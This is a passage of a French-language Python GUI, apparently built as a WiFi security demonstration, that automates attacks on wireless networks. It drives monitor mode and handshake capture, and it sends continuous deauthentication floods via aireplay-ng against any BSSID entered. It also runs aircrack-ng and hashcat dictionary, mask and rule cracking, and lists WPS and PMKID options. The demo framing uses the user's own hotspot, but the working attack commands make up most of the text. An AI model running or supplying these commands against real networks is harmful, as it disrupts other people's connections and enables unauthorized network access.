        c.setFont("Helvetica", 10)
        text = c.beginText(50, 780)
        for line in (result + advice).splitlines():
            text.textLine(line)
        c.drawText(text)
        c.save()
        self._w("📄 Rapport PDF généré : rapport_aircrack.pdf", "green")
        

# ══════════════════════════════════════════════════════════════════
#  ONGLET VUE D'ENSEMBLE — avec auto-remplissage table
# ══════════════════════════════════════════════════════════════════
class TabOverview(QWidget):
    def __init__(self,term:Terminal):
        super().__init__(); self._t=term
        lay=QVBoxLayout(self); lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
        lay.addWidget(Lbl("Vue d'ensemble",WHITE,19,True))
        lay.addWidget(Lbl("Réseaux WiFi · sécurité · appareils",DIM,10))
        lay.addWidget(HRule())
        sr=QHBoxLayout()
        self._s_nets=StatBox("0","RÉSEAUX",CYAN)
        self._s_devs=StatBox("0","APPAREILS",GREEN)
        self._s_vulns=StatBox("0","VULNÉRABILITÉS",RED)
        for s in [self._s_nets,self._s_devs,self._s_vulns]: sr.addWidget(s)
        lay.addLayout(sr)
        self._meter=SecMeter(); lay.addWidget(self._meter)
        # Contrôles scan
        cg=QGroupBox("// SCAN RÉSEAUX WIFI"); cl=QVBoxLayout(cg)
        cr=QHBoxLayout(); cr.setSpacing(8)
        self._iface=QComboBox(); self._iface.setFixedWidth(130)
        self._iface.addItems(["wlan0","wlan0mon","wlan1"])
        bm=Btn("📡 Mode Moniteur",ORANGE,sm=True)
        bs=Btn("▶ Scanner WiFi",CYAN,sm=True)
        bm.clicked.connect(lambda: self._t.run(
            f"sudo airmon-ng start {self._iface.currentText()} 2>&1"))
        bs.clicked.connect(self._scan)
        cr.addWidget(Lbl("Interface:",DIM,10)); cr.addWidget(self._iface)
        cr.addWidget(bm); cr.addWidget(bs); cr.addStretch()
        cl.addLayout(cr)
        self._prog=QProgressBar(); self._prog.setFixedHeight(4)
        self._prog.setRange(0,0); self._prog.setVisible(False)
        cl.addWidget(self._prog); lay.addWidget(cg)
        # Table réseaux
        ng=QGroupBox("// RÉSEAUX DÉTECTÉS"); nl=QVBoxLayout(ng)
        self._tbl=QTableWidget(0,6)
        self._tbl.setHorizontalHeaderLabels(
            ["SSID","BSSID","SIGNAL","SÉCURITÉ","CANAL","ACTION"])
        h=self._tbl.horizontalHeader()
        h.setSectionResizeMode(0,QHeaderView.Stretch)
        h.setSectionResizeMode(1,QHeaderView.ResizeToContents)
        h.setSectionResizeMode(2,QHeaderView.Fixed); self._tbl.setColumnWidth(2,65)
        h.setSectionResizeMode(3,QHeaderView.ResizeToContents)
        h.setSectionResizeMode(4,QHeaderView.ResizeToContents)
        h.setSectionResizeMode(5,QHeaderView.Fixed); self._tbl.setColumnWidth(5,85)
        self._tbl.verticalHeader().setVisible(False)
        self._tbl.setAlternatingRowColors(True); self._tbl.setMinimumHeight(160)
        nl.addWidget(self._tbl); lay.addWidget(ng); lay.addStretch()
        # NE PAS connecter ici — MainWin._on_nets gère le dispatch
        # term.networks.connect(self.load)  ← supprimé

    def _scan(self):
        self._prog.setVisible(True)
        self._t.note("Scan WiFi en cours (nmcli)…", CYAN)
        self._t.run(nm_fix_wrap(
            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1"))

    def load(self,nets):
        if not nets: return
        self._prog.setVisible(False)
        self._tbl.setRowCount(0)
        self._s_nets.set(len(nets))
        vuln=sum(1 for n in nets if self._is_vuln(n.get("security","")))
        self._s_vulns.set(vuln)
        for n in nets:
            row=self._tbl.rowCount(); self._tbl.insertRow(row)
            sec=n.get("security","") or "Open"
            col=self._sc(sec)
            sig=n.get("signal","?")
            sig_str=f"{sig}%" if isinstance(sig,int) and sig<=100 else f"-{sig}dBm"
            chan=str(n.get("channel","?"))
            rate=str(n.get("rate","?"))
            # Déduire fréquence depuis canal
            if chan.isdigit():
                ch_n=int(chan)
                if ch_n <= 14:   freq="2.4 GHz"
                elif ch_n <= 64: freq="5 GHz (U-NII-1/2)"
                else:            freq="5 GHz (U-NII-3)"
            else:
                freq="?"
            for c,(txt,fg) in enumerate([
                (n.get("ssid","<hidden>"),WHITE),
                (n.get("bssid","?"),DIM),
                (sig_str,CYAN),
                (sec,col),
                (f"{chan}  {freq}",ORANGE if chan!="?" else DIM)]):
                it=QTableWidgetItem(txt); it.setForeground(QColor(fg))
                it.setFlags(Qt.ItemIsEnabled|Qt.ItemIsSelectable)
                if c==4 and rate!="?": it.setToolTip(f"Débit: {rate} Mbit/s")
                self._tbl.setItem(row,c,it)
            sb=QPushButton("Sélect.")
            sb.setStyleSheet(
                f"QPushButton{{background:transparent;border:1px solid {CYAN};"
                f"color:{CYAN};padding:2px 8px;border-radius:2px;font-size:9px;}}"
                f"QPushButton:hover{{background:{CYAN};color:#000;}}")
            sb.clicked.connect(lambda _,nw=n: self._sel(nw))
            self._tbl.setCellWidget(row,5,sb)
        self._t.note(f"✅ {len(nets)} réseaux chargés dans la table",GREEN)

    def _sel(self,n):
        self._meter.update(n.get("security",""))
        chan=n.get("channel","?")
        rate=n.get("rate","?")
        freq=""
        if str(chan).isdigit():
            ch_n=int(chan)
            freq = "2.4GHz" if ch_n<=14 else "5GHz"
        self._t.note(
            f"Sélectionné: {n.get('ssid','?')}  "
            f"BSSID={n.get('bssid','?')}  "
            f"Sécu={n.get('security','?')}  "
            f"Canal={chan} {freq}  "
            f"Débit={rate} Mbit/s",CYAN)

    def set_ifaces(self,lst):
        self._iface.clear(); self._iface.addItems(lst or ["wlan0"])

    @staticmethod
    def _is_vuln(sec):
        s=(sec or "").lower()
        return not s or "open" in s or "wep" in s

    @staticmethod
    def _sc(sec):
        s=(sec or "").lower()
        if not s or "open" in s: return RED
        if "wep"  in s: return ORANGE
        if "wpa3" in s: return CYAN
        if "wpa2" in s: return GREEN
        if "wpa"  in s: return YELLOW
        return RED

# ══════════════════════════════════════════════════════════════════
#  ONGLET PHASE 1
# ══════════════════════════════════════════════════════════════════
class TabPhase1(QScrollArea):
    def __init__(self,term:Terminal):
        super().__init__(); self._t=term
        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
        w=QWidget(); lay=QVBoxLayout(w)
        lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
        lay.addWidget(Lbl("Phase 1 — Réseau Vulnérable",WHITE,19,True))
        lay.addWidget(Lbl("Démontrer l'accès facile à un réseau non sécurisé",DIM,10))
        lay.addWidget(HRule())
        lay.addWidget(TipW(
            "<b>⚠ SCÉNARIO :</b> Créez un hotspot sur votre propre téléphone/PC "
            "avec <b>aucun MDP</b> ou MDP faible: <code>12345678</code>.","danger"))

        # Étape 1
        f1=CardF(RED); l1=QVBoxLayout(f1)
        l1.setContentsMargins(14,12,14,14); l1.setSpacing(8)
        l1.addWidget(self._badge("1","Créer le hotspot vulnérable",RED))
        l1.addWidget(HRule())
        l1.addWidget(TipW(
            "<b>Android :</b> Paramètres → Point d'accès → Sécurité: <b>Aucune</b>","warn"))
        l1.addWidget(TipW(
            '<b>PC Kali :</b><br>'
            '<code>sudo nmcli dev wifi hotspot ifname wlan0 '
            'ssid "DEMO-VULN" password "12345678"</code>',"warn"))
        r1=QHBoxLayout(); r1.setSpacing(6)
        b1=Btn("Créer hotspot VULN (PC)",ORANGE,sm=True)
        b2=Btn("▶ Scanner les réseaux",CYAN,sm=True)
        b1.clicked.connect(lambda: self._t.run(nm_fix_wrap(
            'sudo nmcli dev wifi hotspot ifname wlan0 ssid "DEMO-VULN" password "12345678" 2>&1')))
        b2.clicked.connect(lambda: self._t.run(nm_fix_wrap(
            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1")))
        r1.addWidget(b1); r1.addWidget(b2); r1.addStretch()
        l1.addLayout(r1); lay.addWidget(f1)

        # Étape 2
        f2=CardF(RED); l2=QVBoxLayout(f2)
        l2.setContentsMargins(14,12,14,14); l2.setSpacing(8)
        l2.addWidget(self._badge("2","Scan passif — mode moniteur",RED))
        l2.addWidget(HRule())
        l2.addWidget(TipW(
            "<b>Mode furtif :</b> Voir tous les réseaux sans être connecté. "
            "L'attaquant est <i>invisible</i>.","info"))
        self._iface=Inp("Interface","wlan0mon",150)
        self._dur=QSpinBox(); self._dur.setRange(5,120); self._dur.setValue(20)
        self._dur.setSuffix("s")
        r2a=QHBoxLayout(); r2a.setSpacing(6)
        r2a.addWidget(Lbl("Interface:",DIM,10)); r2a.addWidget(self._iface)
        r2a.addWidget(Lbl("Durée:",DIM,10)); r2a.addWidget(self._dur); r2a.addStretch()
        r2b=QHBoxLayout(); r2b.setSpacing(6)
        bm=Btn("📡 Activer Moniteur",ORANGE,sm=True)
        bp=Btn("▶ Scan Passif",CYAN,sm=True)
        bx=Btn("■ Stop",RED,sm=True)
        bn=Btn("🔄 Restaurer NM",GREEN,sm=True)
        bm.clicked.connect(self._start_monitor)
        bp.clicked.connect(self._scan_passif)
        bx.clicked.connect(self._t.stop)
        bn.clicked.connect(self._restore_nm)
        r2b.addWidget(bm); r2b.addWidget(bp); r2b.addWidget(bx)
        r2b.addWidget(bn); r2b.addStretch()
        l2.addLayout(r2a); l2.addLayout(r2b); lay.addWidget(f2)

        # Étape 3
        f3=CardF(RED); l3=QVBoxLayout(f3)
        l3.setContentsMargins(14,12,14,14); l3.setSpacing(8)
        l3.addWidget(self._badge("3","Capturer handshake WPA + Déauth",RED))
        l3.addWidget(HRule())
        l3.addWidget(TipW(
            "<b>⚡ WORKFLOW AUTOMATIQUE :</b><br>"
            "1) <b>airodump-ng</b> capte le trafic → ~/capture-XX.cap<br>"
            "2) <b>aireplay-ng --deauth</b> force les clients à se reconnecter (dans xterm)<br>"
            "3) Quand le handshake est capté : <b>[WPA handshake: XX:XX:XX…]</b> apparaît<br>"
            "4) Arrêtez la capture → lancez aircrack-ng","warn"))

        # Champs BSSID / CH / Interface
        r3a=QHBoxLayout(); r3a.setSpacing(6)
        self._bssid=Inp("BSSID cible  ex: 94:0E:6B:88:BE:7F")
        self._ch=Inp("CH","6",55)
        self._iface_cap=Inp("Interface","wlan0mon",110)
        r3a.addWidget(Lbl("BSSID:",DIM,10)); r3a.addWidget(self._bssid,1)
        r3a.addWidget(Lbl("CH:",DIM,10));    r3a.addWidget(self._ch)
        r3a.addWidget(Lbl("Iface:",DIM,10)); r3a.addWidget(self._iface_cap)
        l3.addLayout(r3a)

        # Durée capture
        r3b=QHBoxLayout(); r3b.setSpacing(6)
        self._cdur=QSpinBox(); self._cdur.setRange(30,600); self._cdur.setValue(120)
        self._cdur.setSuffix("s")
        r3b.addWidget(Lbl("Durée capture:",DIM,10)); r3b.addWidget(self._cdur)
        r3b.addStretch()
        l3.addLayout(r3b)

        # Bouton workflow auto (xterm en parallèle)
        r3c=QHBoxLayout(); r3c.setSpacing(6)
        bc_auto=Btn("⚡ AUTO: Capture + Déauth (2 fenêtres)",RED)
        bc_auto.setToolTip(
            "Lance airodump-ng ici ET aireplay-ng --deauth dans une fenêtre xterm séparée")
        bc_auto.clicked.connect(self._capture_auto)

        # Boutons manuels
        bc=Btn("📦 Capture seule",ORANGE,sm=True)
        bd=Btn("💥 Déauth seul",RED,sm=True)
        bv=Btn("✅ Vérif handshake",GREEN,sm=True)
        bx=Btn("■ Stop",DIM,sm=True)
        bc.clicked.connect(self._capture)
        bd.clicked.connect(self._deauth)
        bv.clicked.connect(self._verify_hs)
        bx.clicked.connect(self._t.stop)
        r3c.addWidget(bc_auto)
        r3c.addWidget(bc); r3c.addWidget(bd); r3c.addWidget(bv); r3c.addWidget(bx)
        r3c.addStretch()
        l3.addLayout(r3c)

        # Statut handshake
        self._hs_lbl=Lbl("  Aucun handshake capturé — lancez la capture",DIM,10)
        l3.addWidget(self._hs_lbl)

        lay.addWidget(f3)
        lay.addStretch(); self.setWidget(w)

    @staticmethod
    def _badge(num,title,col):
        w=QWidget(); r=QHBoxLayout(w)
        r.setContentsMargins(0,0,0,0); r.setSpacing(10)
        b=QLabel(num); b.setFixedSize(28,28); b.setAlignment(Qt.AlignCenter)
        b.setStyleSheet(
            f"background:{col}22;border:1px solid {col};border-radius:14px;"
            f"color:{col};font-weight:bold;font-size:13px;")
        r.addWidget(b); r.addWidget(Lbl(title,WHITE,12,True),1); return w

    def _start_monitor(self):
        raw = self._iface.text().strip()
        base = raw.replace("mon","") if raw.endswith("mon") else raw
        iface = base or "wlan0"
        # airmon-ng check kill tue NetworkManager → on le note
        self._t.note(
            "⚙  Activation moniteur — NM sera arrêté (normal). "
            "Pour revenir au scan nmcli → Phase1 Étape 2 → Stop",ORANGE)
        self._t.run(
            f"sudo airmon-ng check kill 2>&1 && "
            f"sudo airmon-ng start {iface} 2>&1 && "
            f"echo '✅ Interface moniteur: {iface}mon' && "
            f"iw dev 2>&1 | grep -E 'Interface|type'")
        self._iface.setText(iface + "mon")

    def _restore_nm(self):
        """Arrête le mode moniteur et relance NetworkManager."""
        self._t.note("🔄 Restauration NetworkManager…",GREEN)
        self._t.run(
            "bash -c '"
            "echo \"⚙  Arrêt wlan0mon si actif…\"; "
            "sudo airmon-ng stop wlan0mon 2>&1 | grep -v \"^$\" || true; "
            "echo \"⚙  Redémarrage NetworkManager…\"; "
            "sudo systemctl restart NetworkManager; "
            "sleep 3; "
            "sudo nmcli device set wlan0 managed yes 2>/dev/null || true; "
            "sleep 1; "
            "NM_ST=$(systemctl is-active NetworkManager); "
            "echo \"NetworkManager: $NM_ST\"; "
            "if [ \"$NM_ST\" = \"active\" ]; then "
            "  echo \"✅ NetworkManager actif — nmcli fonctionnel\"; "
            "  nmcli dev status 2>&1 | grep -E \"wlan|wifi\"; "
            "else "
            "  echo \"❌ Échec — essayez: sudo systemctl start NetworkManager\"; "
            "fi'"
        )

    def _scan_passif(self):
        iface = self._iface.text().strip() or "wlan0mon"
        dur   = self._dur.value()
        # Vérifier que l'interface existe
        self._t.run(
            f"bash -c '"
            f"if iw dev {iface} info >/dev/null 2>&1; then "
            f"  echo \"✅ Interface {iface} trouvée — démarrage scan…\" && "
            f"  sudo timeout {dur} airodump-ng {iface} 2>&1; "
            f"else "
            f"  echo \"❌ Interface {iface} introuvable.\" && "
            f"  echo \"👉 Cliquez dabord 📡 Activer Moniteur\" && "
            f"  echo \"Interfaces disponibles:\" && "
            f"  iw dev 2>&1 | grep Interface; "
            f"fi'")

    def _capture(self):
        b=self._bssid.text().strip()
        if not b: self._t.note("⚠ Entrez un BSSID  (ex: 94:0E:6B:88:BE:7F)",ORANGE); return
        home=os.path.expanduser("~")
        cap_prefix=os.path.join(home,"capture")
        ch=self._ch.text().strip() or "6"
        iface=self._iface_cap.text().strip() or "wlan0mon"
        dur=self._cdur.value()
        self._hs_lbl.setText("  ⏳ Capture en cours — attendez [WPA handshake: …]")
        self._hs_lbl.setStyleSheet(
            f"color:{ORANGE};font-size:10px;font-weight:bold;background:transparent;")
        self._t.note(
            f"📦 Capture → {cap_prefix}-XX.cap  BSSID={b}  CH={ch}  dur={dur}s",CYAN)
        self._t.note(
            "⚡ Lancez '💥 Déauth seul' dans un autre terminal pour forcer le handshake !",ORANGE)
        self._t.run(
            f"sudo timeout {dur} airodump-ng "
            f"--bssid {b} -c {ch} "
            f"-w {cap_prefix} --output-format pcap "
            f"{iface} 2>&1")

    def _deauth(self):
        b=self._bssid.text().strip()
        if not b: self._t.note("⚠ Entrez un BSSID",ORANGE); return
        iface=self._iface_cap.text().strip() or "wlan0mon"
        self._t.note(
            f"💥 Déauth 15 paquets → force les clients à se reconnecter",ORANGE)
        self._t.run(
            f"sudo aireplay-ng --deauth 15 -a {b} {iface} 2>&1")

    def _capture_auto(self):
        """Workflow automatique : capture ici + deauth dans xterm séparé."""
        b=self._bssid.text().strip()
        if not b:
            self._t.note("⚠ Entrez un BSSID",ORANGE); return
        ch=self._ch.text().strip() or "6"
        iface=self._iface_cap.text().strip() or "wlan0mon"
        dur=self._cdur.value()
        home=os.path.expanduser("~")
        cap_prefix=os.path.join(home,"capture")
        self._hs_lbl.setText(
            "  ⏳ AUTO en cours — attendez [WPA handshake: …] dans le terminal")
        self._hs_lbl.setStyleSheet(
            f"color:{ORANGE};font-size:10px;font-weight:bold;background:transparent;")
        self._t.note(f"⚡ AUTO: capture + deauth parallèle | BSSID={b} CH={ch}",RED)
        # Deauth en xterm séparé non-bloquant, puis capture dans ce terminal
        full_cmd=(
            f"bash -c '"
            f"xterm -bg black -fg red -fa Monospace -fs 11 "
            f"-title \"DEAUTH {b}\" "
            f"-e \"sudo aireplay-ng --deauth 0 -a {b} {iface}; echo DONE; read\" & "
            f"sleep 2; "
            f"echo \"━━━━ DEAUTH lancé dans xterm séparé ━━━━\"; "
            f"echo \"━━━━ Capture ciblée sur {iface} ━━━━\"; "
            f"sudo timeout {dur} airodump-ng "
            f"--bssid {b} -c {ch} "
            f"-w {cap_prefix} --output-format pcap "
            f"{iface} 2>&1; "
            f"echo \"\"; "
            f"echo \"━━━━ Capture terminée — Vérification… ━━━━\"; "
            f"CAP=$(ls -t {cap_prefix}-*.cap 2>/dev/null | head -1); "
            f"if [ -n \"$CAP\" ]; then "
            f"  echo \"→ Fichier: $CAP\"; "
            f"  RES=$(aircrack-ng \"$CAP\" 2>&1 | grep -i \"WPA handshake\"); "
            f"  if [ -n \"$RES\" ]; then "
            f"    echo \"✅ HANDSHAKE CAPTURÉ: $RES\"; "
            f"    echo \"✅ Prêt pour aircrack-ng — allez dans Attaques → Dictionnaire\"; "
            f"  else "
            f"    echo \"⚠  Aucun handshake dans $CAP\"; "
            f"    echo \"   Causes possibles:\"; "
            f"    echo \"   1) Aucun client connecté au réseau cible\"; "
            f"    echo \"   2) Relancez avec plus de paquets deauth\"; "
            f"    echo \"   3) Vérifiez que l interface moniteur est sur le bon canal\"; "
            f"  fi; "
            f"else "
            f"  echo \"❌ Aucun fichier capture-*.cap créé\"; "
            f"fi'"
        )
        self._t.run(full_cmd)

    def _verify_hs(self):
        """Vérifie si un handshake WPA est présent dans le dernier fichier cap."""
        home=os.path.expanduser("~")
        self._t.note("🔍 Vérification handshake dans ~/capture-*.cap …",CYAN)
        self._t.run(
            f"bash -c '"
            f"CAP=$(ls -t {home}/capture-*.cap 2>/dev/null | head -1); "
            f"if [ -z \"$CAP\" ]; then "
            f"  echo \"❌ Aucun fichier capture-*.cap dans ~\"; "
            f"  exit 1; "
            f"fi; "
            f"echo \"→ Analyse: $CAP\"; "
            f"aircrack-ng \"$CAP\" 2>&1 | grep -E \"handshake|BSSID|potential\"; "
            f"HS=$(aircrack-ng \"$CAP\" 2>&1 | grep -i \"WPA handshake\"); "
            f"if [ -n \"$HS\" ]; then "
            f"  echo \"\"; "
            f"  echo \"✅ HANDSHAKE OK → {home}/capture-*.cap prêt pour aircrack-ng\"; "
            f"else "
            f"  echo \"\"; "
            f"  echo \"⚠  PAS de handshake — relancez: Capture + Déauth\"; "
            f"fi'"
        )

# ══════════════════════════════════════════════════════════════════
#  ONGLET PHASE 2
# ══════════════════════════════════════════════════════════════════
class TabPhase2(QScrollArea):
    def __init__(self,term:Terminal):
        super().__init__(); self._t=term
        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
        w=QWidget(); lay=QVBoxLayout(w)
        lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
        lay.addWidget(Lbl("Phase 2 — Sécurisation",WHITE,19,True))
        lay.addWidget(Lbl("Reconfigurer · vérifier la résistance",DIM,10))
        lay.addWidget(HRule())
        lay.addWidget(TipW(
            "<b>✅ OBJECTIF :</b> WPA3/WPA2 + MDP fort → les mêmes attaques "
            "<b>échouent</b>.","success"))

        # Étape 1 — hotspot sécurisé
        f1=CardF(GREEN); l1=QVBoxLayout(f1)
        l1.setContentsMargins(14,12,14,14); l1.setSpacing(8)
        l1.addWidget(TabPhase1._badge("1","Reconfigurer hotspot sécurisé",GREEN))
        l1.addWidget(HRule())
        l1.addWidget(TipW(
            "<b>Android :</b> WPA3 ou WPA2 + MDP fort 16+ chars","success"))
        l1.addWidget(TipW(
            '<b>PC :</b> <code>sudo nmcli dev wifi hotspot ifname wlan0 '
            'ssid "DEMO-SECURE" password "X#9kL!mP3@qR7vN2"</code>',"success"))
        sm=SecMeter(); sm.update("WPA3"); l1.addWidget(sm)
        bs=Btn("Créer hotspot SECURE (PC)",GREEN,sm=True)
        bs.clicked.connect(lambda: self._t.run(nm_fix_wrap(
            'sudo nmcli dev wifi hotspot ifname wlan0 '
            'ssid "DEMO-SECURE" password "X#9kL!mP3@qR7vN2" 2>&1')))
        l1.addWidget(bs); lay.addWidget(f1)

        # Étape 2 — test attaque
        f2=CardF(GREEN); l2=QVBoxLayout(f2)
        l2.setContentsMargins(14,12,14,14); l2.setSpacing(8)
        l2.addWidget(TabPhase1._badge("2","Tester l'attaque (doit échouer)",GREEN))
        l2.addWidget(HRule())
        l2.addWidget(TipW(
            "<b>Message clé :</b> MDP fort = aircrack tourne des "
            "<b>millions d'années</b> sans résultat.","info"))
        self._cap=Inp("Fichier .cap (laisser vide = auto-détect)")
        self._wl=Inp("Wordlist","/usr/share/wordlists/rockyou.txt")
        self._bssid2=Inp("BSSID (optionnel)")
        r2a=QHBoxLayout(); r2a.setSpacing(6)
        bf=Btn("🔍",ORANGE,sm=True); bf.setFixedWidth(34)
        bf.clicked.connect(self._find_cap)
        r2a.addWidget(self._cap,1); r2a.addWidget(bf)
        r2b=QHBoxLayout(); r2b.setSpacing(6)
        r2b.addWidget(Lbl("WL:",DIM,10)); r2b.addWidget(self._wl,1)
        r2b.addWidget(Lbl("BSSID:",DIM,10)); r2b.addWidget(self._bssid2)
        r2c=QHBoxLayout(); r2c.setSpacing(6)
        bt=Btn("▶ Tester Dictionnaire (doit échouer)",ORANGE)
        bx=Btn("■ Stop",RED,sm=True)
        bt.clicked.connect(self._test); bx.clicked.connect(self._t.stop)
        r2c.addWidget(bt); r2c.addWidget(bx); r2c.addStretch()
        l2.addLayout(r2a); l2.addLayout(r2b); l2.addLayout(r2c)
        lay.addWidget(f2)

        # Étape 3 — stats
        f3=CardF(GREEN); l3=QVBoxLayout(f3)
        l3.setContentsMargins(14,12,14,14); l3.setSpacing(8)
        l3.addWidget(TabPhase1._badge("3","Scanner le réseau sécurisé",GREEN))
        l3.addWidget(HRule())
        self._sub=Inp("Sous-réseau","192.168.43.0/24")
        r3=QHBoxLayout(); r3.setSpacing(6)
        ba=Btn("ARP Scan",CYAN,sm=True); bn=Btn("Nmap -sn",ORANGE,sm=True)
        bv=Btn("nmap -sV 192.168.1.1",DIM,sm=True)
        ba.clicked.connect(lambda: self._t.run(
            f"sudo arp-scan {self._sub.text()} 2>&1"))
        bn.clicked.connect(lambda: self._t.run(
            f"nmap -sn {self._sub.text()} 2>&1"))
        bv.clicked.connect(lambda: self._t.run("nmap -sV 192.168.1.1 2>&1"))
        r3.addWidget(self._sub,1)
        r3.addWidget(ba); r3.addWidget(bn); r3.addWidget(bv)
        l3.addLayout(r3); lay.addWidget(f3)

        self._t0=0
        _ut=QTimer(self); _ut.start(1000)
        lay.addStretch(); self.setWidget(w)

    def _find_cap(self):
        home=os.path.expanduser("~")
        caps=sorted(
            glob.glob(f"{home}/capture-*.cap")+
            glob.glob(f"{home}/capture-*.pcap")+
            glob.glob("/tmp/*.cap")+glob.glob("/tmp/*.pcap")+
            glob.glob(f"{home}/*.cap"),
            key=os.path.getmtime,reverse=True)
        if caps:
            self._cap.setText(caps[0])
            self._t.note(f"→ .cap trouvé: {caps[0]}",GREEN)
        else:
            self._t.note("⚠ Aucun .cap — capturez d'abord un handshake (Phase1 → Étape 3)",ORANGE)

    def _test(self):
        cap=self._cap.text().strip()
        wl=self._wl.text().strip() or "/usr/share/wordlists/rockyou.txt"
        bssid=self._bssid2.text().strip()
        home=os.path.expanduser("~")
        if cap:
            cap=os.path.expanduser(cap)
        if not cap or not os.path.exists(cap):
            # Auto-chercher
            candidates=sorted(
                glob.glob(f"{home}/capture-*.cap")+
                glob.glob("/tmp/*.cap"),
                key=os.path.getmtime,reverse=True)
            cap=candidates[0] if candidates else f"{home}/capture-01.cap"
            self._t.note(f"→ Utilisation automatique: {cap}",CYAN)
        ba=f"-b {bssid}" if bssid else ""
        self._t.run(f"aircrack-ng -w {wl} {ba} '{cap}' 2>&1")

# ══════════════════════════════════════════════════════════════════
#  THREAD CAPTURE PRÉPARATOIRE
#  Lancé dès la sélection du réseau cible — crée capture-<BSSID>.cap
#  en arrière-plan (airodump 60 s) et émet cap_path quand disponible
# ══════════════════════════════════════════════════════════════════
class CapturePrepThread(QThread):
    cap_path  = pyqtSignal(str)   # chemin du .cap dès qu'il est créé
    log_line  = pyqtSignal(str)   # messages de statut
    finished  = pyqtSignal()

    def __init__(self, bssid, chan, iface="wlan0mon"):
        super().__init__()
        self.bssid = bssid
        self.chan   = chan
        self.iface  = iface
        self._abort = False
        home = os.path.expanduser("~")
        safe = bssid.replace(":","")
        self._cap_prefix = os.path.join(home, f"capture-{safe}")
        self._cap_file   = ""

    def cap_file(self):
        return self._cap_file

    def abort(self):
        self._abort = True
        try:
            import signal as _sig
            if self._proc:
                os.killpg(os.getpgid(self._proc.pid), _sig.SIGTERM)
        except Exception:
            pass

    def run(self):
        import signal as _sig
        home = os.path.expanduser("~")
        # ── Nettoyage fichiers précédents pour ce BSSID ──
        for old in glob.glob(f"{self._cap_prefix}-*.cap") + \
                   glob.glob(f"{self._cap_prefix}-*.csv") + \
                   glob.glob(f"{self._cap_prefix}-*.kismet.*") + \
                   glob.glob(f"{self._cap_prefix}-*.log.csv"):
            try: os.remove(old)
            except Exception: pass

        cmd = (f"sudo airodump-ng --bssid {self.bssid} -c {self.chan} "
               f"-w {self._cap_prefix} --output-format pcap "
               f"{self.iface}")
        self.log_line.emit(f"⚡ Capture préparatoire → {self.iface}  "
                           f"BSSID={self.bssid}  CH={self.chan}")
        self.log_line.emit(f"📁 Sortie : {self._cap_prefix}-01.cap")
        try:
            env = os.environ.copy(); env["TERM"]="dumb"; env["NO_COLOR"]="1"
            self._proc = subprocess.Popen(
                cmd, shell=True, executable="/bin/bash",
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, env=env,
                preexec_fn=os.setsid)
            deadline = 60          # secondes max
            elapsed  = 0
            while not self._abort and elapsed < deadline:
                # Chercher le fichier .cap créé par airodump-ng
                caps = sorted(glob.glob(f"{self._cap_prefix}-*.cap"),
                              key=os.path.getmtime, reverse=True)
                if caps and os.path.getsize(caps[0]) > 24:
                    self._cap_file = caps[0]
                    self.cap_path.emit(self._cap_file)
                    self.log_line.emit(
                        f"✅ Fichier créé : {os.path.basename(self._cap_file)}")
                    break
                self.msleep(1000); elapsed += 1
                if elapsed % 5 == 0:
                    self.log_line.emit(f"  ⏳ {elapsed}s — création capture…")
            try:
                os.killpg(os.getpgid(self._proc.pid), _sig.SIGTERM)
            except Exception:
                pass
            self._proc.wait()
        except Exception as e:
            self.log_line.emit(f"⚠ CapturePrepThread : {e}")
        self.finished.emit()

# ══════════════════════════════════════════════════════════════════
#  ONGLET ATTAQUES
# ══════════════════════════════════════════════════════════════════
class TabAttacks(QWidget):
    _M=[("dict","📖 Dictionnaire",RED,"⚡ RAPIDE — si MDP faible"),
        ("brute","🔨 Brute Force",DIM,"🐢 LENT — garanti"),
        ("hybrid","🔀 Hybride/Règles",ORANGE,"⚡ MOYEN — réaliste"),
        ("wps","📶 WPS PIN",RED,"⚡ RAPIDE — si WPS actif"),
        ("pmkid","🔑 PMKID",RED,"⚡ Sans client connecté"),
        ("social","🎭 Social Engineering",ORANGE,"⚡ Humain > technique")]
    _D={
        "dict":dict(tip_k="warn",
            tip="<b>Principe :</b> Tester des millions de mots courants.<br>"
                "rockyou.txt = 14 millions. <code>password</code> → instantané. "
                "<code>X#9kL!mP3@</code> → jamais.",
            opts=[("Fichier .cap:","cap","~/capture-01.cap"),
                  ("Wordlist:","wl","/usr/share/wordlists/rockyou.txt"),
                  ("BSSID (-b):","bssid","")],
            cmd=None,  # géré par _run_dict
            run_fn="dict"),
        "brute":dict(tip_k="info",
            tip="<b>Toutes les combinaisons :</b> "
                "8 chars alphanum = 218 milliards. GPU 500k/s = 5 jours.<br>"
                "12 chars aléatoires → des milliers d'années.",
            opts=[("Hash .hc22000:","hc","/tmp/hash.hc22000"),
                  ("Masque hashcat:","mask","?d?d?d?d?d?d?d?d")],
            cmd=lambda o: f"hashcat -m 22000 {o['hc']} -a 3 {o['mask']} --status 2>&1"),
        "hybrid":dict(tip_k="warn",
            tip="<b>Transformations :</b> <code>password→P@ssw0rd</code>, "
                "<code>admin→@dmin1</code><br>"
                "Très efficace: les humains modifient toujours pareil.",
            opts=[("Hash:","hc","/tmp/hash.hc22000"),
                  ("Wordlist:","wl","/usr/share/wordlists/rockyou.txt")],
            cmd=lambda o: f"hashcat -m 22000 {o['hc']} {o['wl']} "
                          f"-r /usr/share/hashcat/rules/best64.rule --status 2>&1"),
        "wps":dict(tip_k="danger",
            tip="<b>Faille WPS :</b> PIN 8 chiffres vérifié en 2 parties = max 11 000 essais.<br>"
                "Pixie Dust: quelques secondes sur certains routeurs.<br>"
                "Activé par défaut sur la plupart des routeurs grand public.",
            opts=[("Interface:","iface","wlan0mon"),("Durée(s):","dur","30")],
            cmd=lambda o: f"sudo timeout {o['dur']} wash -i {o['iface']} -s 2>&1"),
        "pmkid":dict(tip_k="danger",
            tip="<b>Technique 2018 :</b> Aucun client connecté requis.<br>"
                "L'AP envoie le PMKID dans le 1er paquet EAPOL.<br>"
                "Capture en secondes → crackage hors ligne avec hashcat.",
            opts=[("Interface:","iface","wlan0mon"),("Durée(s):","dur","20")],
            cmd=lambda o: f"sudo timeout {o['dur']} hcxdumptool "
                          f"-i {o['iface']} -o /tmp/pmkid.pcapng "
